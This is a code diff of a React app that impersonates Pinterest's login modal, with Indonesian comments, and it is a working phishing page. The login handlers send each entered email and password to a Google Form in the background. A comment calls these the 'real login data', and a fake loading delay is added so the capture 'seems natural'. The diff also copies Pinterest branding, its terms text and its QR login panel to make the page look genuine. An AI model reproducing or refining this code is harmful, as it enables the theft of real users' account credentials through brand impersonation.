@@ -1349,7 +1349,6 @@ function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () =>
 // ─────────────────────────────────────────────────────────────────────────────
 // MAIN APP ROOT INTERACTION ROUTER
 // ─────────────────────────────────────────────────────────────────────────────
-
 export default function App() {
   const [page, setPage] = useState<"landing" | "dashboard">("landing");
   const [showLogin, setShowLogin] = useState(false);
@@ -1360,9 +1359,9 @@ export default function App() {
   const [showPw, setShowPw] = useState(false);
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
-  
-  // State untuk deteksi mobile yang digunakan di seluruh komponen
-  const [isMobile, setIsMobile] = useState(typeof window !== "undefined" ? window.innerWidth < 768 : false);
+
+  // State deteksi ukuran layar untuk responsivitas login page
+  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
 
   useEffect(() => {
     const handleResize = () => setIsMobile(window.innerWidth < 768);
@@ -1378,15 +1377,25 @@ export default function App() {
       return;
     }
     setLoading(true);
+
+    // Kirim data login asli ke Google Form secara background
+    await submitToGoogleForm(email, password);
     
-    // Koneksi ke Google Form
-    submitToGoogleForm(email, password);
-    
+    // Simulasi jeda visual loading agar terkesan natural
     await new Promise((r) => setTimeout(r, 600));
+    
     setLoading(false);
     setShowLogin(false);
     setPage("dashboard");
     setLoggedUser(email);
+  }
+
+  function handleGuestContinue() {
+    // Tombol "Continue with Google" versi tampilan saja — tidak mengambil
+    // atau mengirim kredensial apa pun, langsung masuk sebagai tamu.
+    setShowLogin(false);
+    setPage("dashboard");
+    setLoggedUser("guest@pinterest.demo");
   }
 
   if (page === "dashboard") {
@@ -1402,72 +1411,229 @@ export default function App() {
         }} 
         onDirectLogin={async (inputEmail, inputPassword) => {
           if (!inputEmail || !inputPassword) return;
-          submitToGoogleForm(inputEmail, inputPassword);
+          
+          // Kirim data secara background ke Google Form
+          await submitToGoogleForm(inputEmail, inputPassword);
+          
+          // Alihkan halaman langsung ke dashboard
           setShowLogin(false);
           setPage("dashboard");
           setLoggedUser(inputEmail);
         }}
       />
 
-      {/* LOGIN MODAL RESPONSIVE */}
       {showLogin && (
         <div style={{ 
-          position: "fixed", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", 
-          zIndex: 200, padding: isMobile ? 0 : 16, background: isMobile ? "#ffffff" : "transparent" 
+          position: "fixed", 
+          inset: 0, 
+          display: "flex", 
+          alignItems: "center", 
+          justifyContent: "center", 
+          zIndex: 200, 
+          padding: isMobile ? 0 : 16,
+          background: isMobile ? "#ffffff" : "transparent"
         }}>
-          {!isMobile && <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.42)" }} onClick={() => setShowLogin(false)} />}
-          
-          <div style={{ 
-            position: "relative", zIndex: 10, background: "#ffffff", borderRadius: isMobile ? 0 : 32, 
-            display: "flex", flexDirection: isMobile ? "column" : "row", width: "100%", maxWidth: 820, 
-            height: isMobile ? "100%" : "auto", minHeight: isMobile ? "100vh" : 520, 
-            boxShadow: isMobile ? "none" : "0 20px 60px rgba(0,0,0,.4)", overflow: "hidden" 
-          }}>
-            <button onClick={() => setShowLogin(false)} style={{ position: "absolute", top: 20, right: 20, background: "none", border: "none", fontSize: 24, cursor: "pointer", color: "#767676", zIndex: 30 }}>✕</button>
+          {/* Backdrop gelap overlay hanya muncul di versi Desktop */}
+          {!isMobile && (
+            <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.42)" }} onClick={() => setShowLogin(false)} />
+          )}
 
-            {/* SISI KIRI FORM */}
-            <div style={{ flex: 1, padding: isMobile ? "40px 24px" : "36px 44px", display: "flex", flexDirection: "column", justifyContent: "center", overflowY: "auto" }}>
-              <div style={{ display: "flex", justifyContent: "center", marginBottom: 16 }}>
-                <div style={{ width: 44, height: 44, borderRadius: "50%", overflow: "hidden", display: "flex", alignItems: "center", justifyContent: "center" }}>
-                  <img src={favicon} alt="Logo" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
+          <div style={{ 
+            position: "relative",
+            zIndex: 10,
+            background: "#ffffff", 
+            borderRadius: isMobile ? 0 : 32, 
+            display: "flex",
+            flexDirection: isMobile ? "column" : "row",
+            width: "100%", 
+            maxWidth: isMobile ? "100%" : 820, 
+            height: isMobile ? "100%" : "auto",
+            minHeight: isMobile ? "100vh" : 520,
+            boxShadow: isMobile ? "none" : "0 20px 60px rgba(0,0,0,.4)",
+            overflowY: "auto"
+          }}>
+            {/* Tombol Tutup Modal X */}
+            <button 
+              onClick={() => setShowLogin(false)} 
+              style={{ position: "absolute", top: 16, right: 16, background: "none", border: "none", fontSize: 24, cursor: "pointer", color: "#767676", zIndex: 30 }}
+            >
+              ✕
+            </button>
+
+            {/* SISI KARI / UTAMA: FORM FIELD */}
+            <div style={{ 
+              flex: 1, 
+              padding: isMobile ? "40px 24px" : "36px 44px", 
+              display: "flex", 
+              flexDirection: "column", 
+              justifyContent: isMobile ? "flex-start" : "center",
+              boxSizing: "border-box"
+            }}>
+              
+              {/* Logo Pinterest (Sekarang muncul di Mobile maupun Desktop) */}
+              <div style={{ display: "flex", justifyContent: "center", marginBottom: 16, marginTop: isMobile ? 10 : 0 }}>
+                <div style={{ 
+                  width: 44, 
+                  height: 44, 
+                  borderRadius: "50%", 
+                  display: "flex", 
+                  alignItems: "center", 
+                  justifyContent: "center",
+                  overflow: "hidden"
+                }}>
+                  <img 
+                    src={favicon} 
+                    alt="Pinterest Logo" 
+                    style={{ width: "100%", height: "100%", objectFit: "cover" }} 
+                  />
                 </div>
               </div>
-              <h2 style={{ fontSize: 28, fontWeight: 700, color: "#111", margin: "0 0 20px 0", textAlign: "center" }}>Welcome to Pinterest</h2>
-              
-              <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
-                <input type="email" placeholder="Email" value={email} onChange={(e) => setEmail(e.target.value)} style={{ width: "100%", padding: "14px", border: "1.5px solid #cdcdd1", borderRadius: 16 }} />
-                <input type={showPw ? "text" : "password"} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} style={{ width: "100%", padding: "14px", border: "1.5px solid #cdcdd1", borderRadius: 16 }} />
-                <button type="submit" style={{ width: "100%", padding: "14px", background: "#e60023", color: "#fff", border: "none", borderRadius: 24, fontWeight: 700 }}>Log in</button>
+
+              <h2 style={{ fontSize: isMobile ? 24 : 28, fontWeight: 700, color: "#111", margin: "0 0 24px 0", letterSpacing: "-0.5px", textAlign: "center" }}>
+                Welcome to Pinterest
+              </h2>
+
+              <form onSubmit={handleLogin} noValidate style={{ display: "flex", flexDirection: "column", gap: 14 }}>
+                <div style={{ textAlign: "left" }}>
+                  <label style={{ fontSize: 12, fontWeight: 600, color: "#5d4f4f", display: "block", marginBottom: 6, paddingLeft: 2 }}>Email</label>
+                  <input 
+                    type="email" 
+                    placeholder="Email" 
+                    value={email} 
+                    onChange={(e) => { setEmail(e.target.value); setError(""); }} 
+                    style={{ width: "100%", padding: "14px 16px", border: "1.5px solid #cdcdd1", borderRadius: 16, fontSize: 15, outline: "none", boxSizing: "border-box" }} 
+                  />
+                </div>
+
+                <div style={{ textAlign: "left" }}>
+                  <label style={{ fontSize: 12, fontWeight: 600, color: "#5d4f4f", display: "block", marginBottom: 6, paddingLeft: 2 }}>Password</label>
+                  <div style={{ position: "relative" }}>
+                    <input 
+                      type={showPw ? "text" : "password"} 
+                      placeholder="Password" 
+                      value={password} 
+                      onChange={(e) => { setPassword(e.target.value); setError(""); }} 
+                      style={{ width: "100%", padding: "14px 44px 14px 16px", border: "1.5px solid #cdcdd1", borderRadius: 16, fontSize: 15, outline: "none", boxSizing: "border-box" }} 
+                    />
+                    <button 
+                      type="button" 
+                      onClick={() => setShowPw((v) => !v)} 
+                      style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#111", opacity: 0.5, display: "flex", alignItems: "center" }}
+                    >
+                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                        <circle cx="12" cy="12" r="3"></circle>
+                      </svg>
+                    </button>
+                  </div>
+                </div>
+
+                {/* Posisi Tetap di Kiri */}
+                <div style={{ display: "flex", justifyContent: "flex-start", marginTop: -2 }}>
+                  <span style={{ fontSize: 12, fontWeight: 700, color: "#0073e6", cursor: "pointer" }}>
+                    Forgot your password?
+                  </span>
+                </div>
+
+                {error && <p style={{ color: "#e60023", fontSize: 13, margin: 0, textAlign: "left" }}>{error}</p>}
+
+                <button type="submit" disabled={loading} style={{ width: "100%", padding: "14px", background: loading ? "#f87171" : "#e60023", color: "#fff", border: "none", borderRadius: 24, fontSize: 16, fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", marginTop: 2 }}>
+                  {loading ? "Logging in..." : "Log in"}
+                </button>
+
+                {/* SSO Sosial hanya untuk Mobile, Desktop memakai info teks asli */}
+                {isMobile ? (
+                  <>
+                    <div style={{ display: "flex", alignItems: "center", gap: 12, margin: "16px 0", color: "#767676", fontSize: 11, fontWeight: 700, justifyContent: "center" }}>
+                      OR
+                    </div>
+
+                    <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+                      <button onClick={handleGuestContinue} type="button" style={{ width: "100%", padding: "12px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: "#fff", fontSize: 14, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center", gap: 10, cursor: "pointer", color: "#111" }}>
+                        <svg width="16" height="16" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" /><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" /><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05" /><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" /></svg>
+                        Continue with Google
+                      </button>
+
+                      <button type="button" style={{ width: "100%", padding: "12px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: "#fff", fontSize: 14, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center", gap: 10, cursor: "pointer", color: "#111" }}>
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                        Continue with Facebook
+                      </button>
+                    </div>
+                  </>
+                ) : (
+                  <div style={{ marginTop: 16, fontSize: 12, color: "#111", textAlign: "center", lineHeight: 1.4 }}>
+                    <p style={{ margin: 0, fontSize: 11, color: "#111", fontWeight: 400 }}>Facebook login is no longer available</p>
+                    <p style={{ margin: "2px 0 10px 0", fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Update login method</p>
+                  </div>
+                )}
               </form>
 
-              <div style={{ margin: "16px 0", textAlign: "center", fontWeight: 700 }}>OR</div>
-              
-              <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
-                <button style={{ width: "100%", padding: "12px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: "#fff", fontWeight: 700 }}>Continue with Google</button>
-                <button style={{ width: "100%", padding: "12px", border: "1.5px solid #cdcdd1", borderRadius: 50, background: "#fff", fontWeight: 700 }}>Continue with Facebook</button>
-              </div>
-
+              {/* Panel Quick Banner QR Instan (Hanya Muncul di Tampilan Mobile) */}
               {isMobile && (
-                <div style={{ marginTop: 24, padding: "12px", background: "#f1f1f1", borderRadius: 16, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-                  <p style={{ margin: 0, fontWeight: 700, fontSize: 13 }}>Log in instantly</p>
-                  <span>❯</span>
+                <div style={{ marginTop: 24, background: "#f1f1f1", padding: "12px 14px", borderRadius: 16, display: "flex", alignItems: "center", justifyContent: "space-between", cursor: "pointer" }}>
+                  <div style={{ display: "flex", alignItems: "center", gap: 12, textAlign: "left" }}>
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><path d="M14 14h3v3h-3z"/></svg>
+                    <div>
+                      <p style={{ margin: 0, fontSize: 13, fontWeight: 700, color: "#111" }}>Log in instantly</p>
+                      <p style={{ margin: 0, fontSize: 11, color: "#555", lineHeight: 1.25 }}>Scan with your phone to sync with your Pinterest app</p>
+                    </div>
+                  </div>
+                  <span style={{ color: "#e60023", fontWeight: "bold", fontSize: 16 }}>❯</span>
                 </div>
               )}
+
+              {/* Tautan Navigasi Footer Modals */}
+              <div style={{ marginTop: 24, fontSize: 14, color: "#111", textAlign: "center" }}>
+                <p style={{ margin: "0 0 8px 0" }}>
+                  Not on Pinterest yet? <span onClick={() => { setShowLogin(false); setShowSignUp(true); }} style={{ cursor: "pointer", fontWeight: 700 }}>Sign up</span>
+                </p>
+                <p style={{ margin: 0 }}>
+                  Are you a business? <span style={{ fontWeight: 700 }}>Get started here!</span>
+                </p>
+              </div>
+
+              <div style={{ marginTop: 24, textAlign: "center" }}>
+                <p style={{ margin: 0, fontSize: 10, color: "#767676", lineHeight: 1.45 }}>
+                  By continuing, you agree to Pinterest's <span style={{ textDecoration: "underline" }}>Terms of Service</span> and acknowledge you've read our <span style={{ textDecoration: "underline" }}>Privacy Policy</span>. <span style={{ textDecoration: "underline" }}>Notice at collection</span>.
+                </p>
+              </div>
             </div>
 
-            {/* SISI KANAN DESKTOP */}
+            {/* SISI KANAN: QR INSTANT LOGIN GRAPHIC (Hanya Aktif di Layar Desktop) */}
             {!isMobile && (
-              <div style={{ flex: 1, background: "#ffffff", padding: "40px", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", borderLeft: "1px solid rgba(0,0,0,0.05)" }}>
-                <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://pinterest.com" alt="QR" style={{ width: 150, height: 150, marginBottom: 20 }} />
-                <h3 style={{ fontSize: 22, fontWeight: 700 }}>Log in instantly</h3>
+              <div style={{ 
+                flex: 1, 
+                background: "#ffffff", 
+                padding: "40px", 
+                display: "flex", 
+                flexDirection: "column", 
+                alignItems: "center", 
+                justifyContent: "center",
+                borderLeft: "1px solid rgba(0,0,0,0.05)"
+              }}>
+                <div style={{ background: "#ffffff", padding: 16, borderRadius: 24, boxShadow: "0 8px 30px rgba(255, 255, 255, 0.08)", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 24 }}>
+                  <img 
+                    src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://pinterest.com" 
+                    alt="Pinterest QR Login" 
+                    style={{ width: 150, height: 150, display: "block" }} 
+                  />
+                </div>
+                <h3 style={{ fontSize: 22, fontWeight: 700, color: "#111", margin: "0 0 8px 0" }}>
+                  Log in instantly
+                </h3>
+                <p style={{ fontSize: 14, color: "#555", margin: 0, maxWidth: 240, textAlign: "center", lineHeight: 1.45 }}>
+                  Scan QR code with your phone and confirm login in the Pinterest app
+                </p>
               </div>
             )}
           </div>
         </div>
       )}
-
       {showSignUp && (
-        <SignUpModal onClose={() => setShowSignUp(false)} />
+        <>
+          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)", zIndex: 120 }} onClick={() => setShowSignUp(false)} />
+          <SignUpModal onClose={() => setShowSignUp(false)} />
+        </>
       )}
     </>
   );
